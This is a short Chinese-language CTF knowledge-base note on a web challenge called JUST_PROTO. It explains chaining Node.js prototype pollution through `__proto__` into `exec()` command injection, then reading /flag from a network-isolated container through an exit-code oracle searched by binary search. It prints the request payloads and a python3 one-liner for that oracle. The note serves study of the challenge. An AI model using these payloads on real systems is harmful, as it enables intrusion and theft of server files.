---
title: JUST_PROTO — Node.js 原型污染 + 命令注入 + 盲外带
category: web
tags: [prototype-pollution, nodejs, command-injection, blind-oracle, exec]
triggers: [JUST_PROTO, 原型链污染, __proto__, exec, 盲外带, Node.js exec, 网络隔离]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/JUST_PROTO.md]
---

## Summary

Node.js 原型链污染 (`__proto__`) + `exec()` 命令注入 + 盲 Oracle 外带。靶机容器完全网络隔离（连 localhost 都不通）。

## Key Points

### 原型链污染
- `date[token][key] = val` 赋值模式是原生污染点
- 注入 `redis_set` 字段覆盖后续命令参数

### 命令注入
- 通过 `exec(ba.redis_set + ...)` 触发
- 用 `\n` 或 `#` 截断命令（分号 `;` 被 URL 编码处理有问题）

### 盲外带策略
- 容器完全网络隔离 → 无法回连外带
- 使用 `exit(0/1)` 做 exit code 盲 Oracle
- 二分搜索 [0,255] 逐字符定位，每字符约 7 次请求（线性扫描需 70×39=2730 次）

### 核心 Payload
```python
# 原型污染注入 redis_set
GET /set?token=__proto__&key=redis_set&val=<payload>#

# 触发命令注入
PUT /bkup

# 盲 oracle: python3 exit code
python3 -c "import subprocess;f=subprocess.run(['cat','/flag'],capture_output=True).stdout;exit(0 if len(f)>N and f[N]>=M else 1)"#
```

## Connections
- Related: [[prototype-pollution-command-injection]]
- Related: [[skill-commands-reference#Web]]
